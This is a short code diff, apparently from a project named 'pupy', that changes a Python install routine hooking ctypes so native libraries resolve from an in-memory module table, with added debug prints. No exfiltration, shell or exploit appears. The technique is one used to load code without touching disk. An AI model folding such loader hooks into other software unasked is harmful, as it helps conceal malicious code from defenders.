@@ -502,9 +502,10 @@ def install(debug=None, trace=False):
         return name
 
     def pupy_find_library(name):
-        dprint("FIND LIBRARY: {}".format(name))
-        if name in modules:
-            return name
+        pupyized = pupy_make_path(name)
+        if pupyized in modules:
+            dprint("FIND LIBRARY: {} => {}".format(name, pupyized))
+            return pupyized
         else:
             return ctypes.util._system_find_library(name)
 
@@ -539,6 +540,7 @@ def install(debug=None, trace=False):
                 self._FuncPtr_orig = self._FuncPtr
                 self._FuncPtr = self._find_function_address
                 self._name = pupy_make_path(self._name)
+                dprint('CDLL({})'.format(self._name))
 
             def _find_function_address(self, search_tuple):
                 name, handle = search_tuple
